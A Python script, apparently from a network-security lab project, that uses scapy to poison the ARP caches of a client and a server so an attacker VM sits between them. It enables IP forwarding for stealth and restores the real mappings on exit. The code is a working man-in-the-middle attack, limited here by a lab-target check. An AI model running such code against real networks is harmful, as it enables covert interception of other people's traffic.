#!/usr/bin/env python3
"""
Phase 2 - MITM Positioning (Design Report Section 4 / Section 3.2).

Poisons the client's and server's ARP caches so each maps the other's IP to
the attacker's MAC address, placing the attacker on-path for Phases 3 and 4.
Enables IP forwarding on start so traffic keeps flowing invisibly
(Section 2.2: "the victim notices nothing"), and restores the real ARP
mappings + forwarding state cleanly on Ctrl-C.

Run on the ATTACKER VM (192.168.56.30):
    sudo python3 attacker/arp_spoof.py --client 192.168.56.10 \
        --server 192.168.56.20 --iface eth1

Verify: `arp -n` on the client and server should show the attacker's MAC
against the other host's IP while this is running, and the real MAC again
after Ctrl-C.
"""

import argparse
import signal
import sys

from scapy.all import ARP, Ether, get_if_hwaddr, send

from common import RateLimiter, get_mac, require_lab_targets, set_ip_forwarding, setup_logging

log = setup_logging("arp_spoof")


def build_arp_reply(target_ip, target_mac, spoofed_ip, spoofed_mac):
    """One forged ARP reply (Section 3.2 fields):
       Opcode=2 (Reply, unsolicited); Sender IP/MAC = the lie we're telling;
       Target IP/MAC = the host we're poisoning."""
    return Ether(dst=target_mac) / ARP(
        op=2,                     # Opcode: 2 = Reply
        pdst=target_ip,           # Target IP: the host being poisoned
        hwdst=target_mac,         # Target MAC: ditto, unicast so it's less noisy
        psrc=spoofed_ip,          # Sender IP: the identity we're forging
        hwsrc=spoofed_mac,        # Sender MAC: attacker's MAC (the actual spoof)
    )


def poison_once(client_ip, client_mac, server_ip, server_mac, attacker_mac, iface):
    # Tell the client: "server_ip lives at attacker_mac"
    send(build_arp_reply(client_ip, client_mac, server_ip, attacker_mac), iface=iface, verbose=False)
    # Tell the server: "client_ip lives at attacker_mac"
    send(build_arp_reply(server_ip, server_mac, client_ip, attacker_mac), iface=iface, verbose=False)


def restore_once(client_ip, client_mac, server_ip, server_mac, iface):
    # Undo the lie: tell each side the other's *real* MAC, so entries heal
    # even before their natural ARP-cache timeout.
    send(build_arp_reply(client_ip, client_mac, server_ip, server_mac), iface=iface, verbose=False)
    send(build_arp_reply(server_ip, server_mac, client_ip, client_mac), iface=iface, verbose=False)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--client", required=True, help="victim client IP")
    parser.add_argument("--server", required=True, help="victim server IP")
    parser.add_argument("--iface", required=True, help="attacker NIC, e.g. eth1")
    parser.add_argument("--interval", type=float, default=2.0, help="seconds between poison bursts")
    parser.add_argument("--restore-count", type=int, default=5, help="correcting replies sent on exit")
    args = parser.parse_args()

    require_lab_targets(args.client, args.server)

    attacker_mac = get_if_hwaddr(args.iface)
    log.info("Attacker MAC on %s: %s", args.iface, attacker_mac)

    log.info("Resolving real MAC addresses (needed to restore ARP caches later)...")
    client_mac = get_mac(args.client, iface=args.iface)
    server_mac = get_mac(args.server, iface=args.iface)
    log.info("client %s -> %s", args.client, client_mac)
    log.info("server %s -> %s", args.server, server_mac)

    state = {"running": True}

    def handle_sigint(signum, frame):
        state["running"] = False

    signal.signal(signal.SIGINT, handle_sigint)

    set_ip_forwarding(True)
    log.info(
        "Poisoning started: %s <-> %s both now believe the other is at %s "
        "(Ctrl-C to stop and restore)",
        args.client, args.server, attacker_mac,
    )

    limiter = RateLimiter(args.interval)
    packets_sent = 0
    try:
        while state["running"]:
            poison_once(args.client, client_mac, args.server, server_mac, attacker_mac, args.iface)
            packets_sent += 2
            if packets_sent % 20 == 0:
                log.info("%d spoofed ARP replies sent so far", packets_sent)
            limiter.wait()
    finally:
        log.info("Restoring real ARP mappings on both hosts...")
        for _ in range(args.restore_count):
            restore_once(args.client, client_mac, args.server, server_mac, args.iface)
        set_ip_forwarding(False)
        log.info("Done. ARP caches restored, IP forwarding disabled.")


if __name__ == "__main__":
    main()
